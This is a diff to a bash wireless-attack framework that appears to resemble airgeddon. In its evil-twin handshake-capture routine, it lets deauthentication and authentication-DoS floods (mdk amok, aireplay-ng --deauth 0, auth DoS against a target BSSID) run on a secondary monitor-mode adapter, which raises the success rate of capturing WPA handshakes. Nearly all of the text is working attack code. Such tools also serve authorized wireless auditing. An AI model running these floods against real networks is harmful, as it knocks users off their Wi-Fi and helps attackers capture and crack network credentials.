@@ -14852,15 +14852,23 @@ function capture_handshake_evil_twin() {
 	ask_timeout "capture_handshake_decloak"
 	capture_handshake_window
 
+	#Use the secondary adapter for the capture-phase deauth when available, so the
+	#main adapter is free to capture the handshake (separate radios = higher success).
+	hs_deauth_iface="${interface}"
+	if [[ "${dos_pursuit_mode}" -eq 1 ]] && [[ -n "${secondary_wifi_interface}" ]] && check_monitor_enabled "${secondary_wifi_interface}"; then
+		hs_deauth_iface="${secondary_wifi_interface}"
+		iw dev "${hs_deauth_iface}" set channel "${channel}" > /dev/null 2>&1
+	fi
+
 	case ${et_dos_attack} in
 		"${mdk_command}")
 			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
 			echo "${bssid}" > "${tmpdir}bl.txt"
 			iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 			recalculate_windows_sizes
-			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"${mdk_command} amok attack\"" "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack"
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"${mdk_command} amok attack\"" "${mdk_command} ${hs_deauth_iface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack"
 			if [ "${AIRSNIFFER_WINDOWS_HANDLING}" = "tmux" ]; then
-				get_tmux_process_id "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}"
+				get_tmux_process_id "${mdk_command} ${hs_deauth_iface} d -b ${tmpdir}bl.txt -c ${channel}"
 				processidattack="${global_process_pid}"
 				global_process_pid=""
 			fi
@@ -14869,9 +14877,9 @@ function capture_handshake_evil_twin() {
 		"Aireplay")
 			iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 			recalculate_windows_sizes
-			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${hs_deauth_iface}" "aireplay deauth attack"
 			if [ "${AIRSNIFFER_WINDOWS_HANDLING}" = "tmux" ]; then
-				get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}"
+				get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${hs_deauth_iface}"
 				processidattack="${global_process_pid}"
 				global_process_pid=""
 			fi
@@ -14880,9 +14888,9 @@ function capture_handshake_evil_twin() {
 		"Auth DoS")
 			iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 			recalculate_windows_sizes
-			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"auth dos attack\"" "${mdk_command} ${interface} a -a ${bssid} -m" "auth dos attack"
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"auth dos attack\"" "${mdk_command} ${hs_deauth_iface} a -a ${bssid} -m" "auth dos attack"
 			if [ "${AIRSNIFFER_WINDOWS_HANDLING}" = "tmux" ]; then
-				get_tmux_process_id "${mdk_command} ${interface} a -a ${bssid} -m"
+				get_tmux_process_id "${mdk_command} ${hs_deauth_iface} a -a ${bssid} -m"
 				processidattack="${global_process_pid}"
 				global_process_pid=""
 			fi
